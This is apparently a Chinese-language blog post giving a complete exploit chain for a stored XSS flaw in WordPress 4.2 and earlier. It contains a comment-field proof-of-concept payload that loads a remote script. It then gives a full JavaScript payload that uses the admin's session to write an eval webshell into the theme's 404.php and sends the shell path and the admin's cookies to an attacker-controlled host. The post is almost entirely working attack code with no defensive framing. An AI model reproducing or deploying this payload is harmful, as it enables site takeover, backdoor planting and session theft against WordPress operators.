---
title: WordPress 4.2 Stored XSS Getshell via XSS Platform
date: 2016-06-13 00:56:15
tags: WordPress,XSS
---

#### Information
WordPress 4.2 Stored XSS  
受影响范围：WordPress 4.2, 4.1.2, 4.1.1, 3.9.3
匿名评论后管理员前台触发，覆盖率全屏窗口

#### POC：
```
<a title='x onmouseover=eval(unescape(/with%28document%290%5Bbody.appendChild%28createElement%28%27script%27%29%29.src%3D%27http%3A%2f%2ft.cn%2fR5ivC0L%27%5D/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAA...[64kb]..AAAAA'>test</a>
```
<!--more-->

#### xsser.me Platform

添加shell参数用于接收webshell地址
> javascript code

```
var xmlHttp;var content404,theme,_wpnonce,content,path,x ;
x = document.location.pathname;
path = x.substr(0,x.indexOf('index.php'));
function createXMLHttpRequest() {
    if (window.ActiveXObject) {
        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    else if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest();
    }
}
function doRequest(url) {
    createXMLHttpRequest();
    xmlHttp.onreadystatechange = handleStateChange;
    xmlHttp.open("GET", url, true);
    xmlHttp.send(null);
}
function handleStateChange() {
    if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {
        content404 = xmlHttp.responseText;
        theme = new RegExp("<input type=\"hidden\" name=\"theme\" value=\"(.+?)\" />").exec(content404)[1]
        _wpnonce = new RegExp("<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"(.+?)\" />").exec(content404)[1]
        content = rhtmlspecialchars(new RegExp("(:?aria-describedby=\"newcontent-description\">)([^<]+)").exec(content404)[2].replace('&lt;?php',"&lt;?php\n@eval($_POST['c']);"))
//Post code
        var data = "_wpnonce="+_wpnonce+"&_wp_http_referer="+encodeURIComponent(window.location.pathname+"?file=404.php")+"&newcontent="+encodeURIComponent(content)+"&action=update&file=404.php&theme="+theme+"&scrollto=0&docs-list=&submit=Update+File"
        doPostRequest(document.location.origin+path+"wp-admin/theme-editor.php",data)
    }
}
function rhtmlspecialchars(str) {
    if (typeof(str) == "string") {
        str = str.replace(/&gt;/ig, ">");
        str = str.replace(/&lt;/ig, "<");
        str = str.replace(/&#039;/ig, "'");
        str = str.replace(/&quot;/ig, '"');
        str = str.replace(/&amp;/ig, '&'); /* must do &amp; last */
    }
    return str;
}
doRequest(document.location.origin+path+"wp-admin/theme-editor.php/?file=404.php")
function doPostRequest(url,data) {
    createXMLHttpRequest();
    xmlHttp.onreadystatechange = handleStateChangePost;
    xmlHttp.open("POST", url, true);
    xmlHttp.setRequestHeader('Content-type','application/x-www-form-urlencoded');
    xmlHttp.send(data);
}
function handleStateChangePost() {
    if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {
        doRequest2(document.location.origin+document.location.pathname+"/index.php?p=9999999999999998888")
    }
}

function doRequest2(url) {
    createXMLHttpRequest();
    xmlHttp.onreadystatechange = handleStateChange3;
    xmlHttp.open("GET", url, true);
    xmlHttp.send(null);
}
function handleStateChange3()
{
    if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {
        (function(){(new Image).src='http://youdomain.com/index.php?do=api&id={projectId}&shell='+escape(document.location.origin+path+"/wp-content/themes/"+theme+'/404.php')+'&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})())})()
    }
}
```



#### from

```
http://klikki.fi/adv/wordpress2.html
http://kinozoa.com/blog/wordpress-4-2-comment-field-overflow-exploit/
```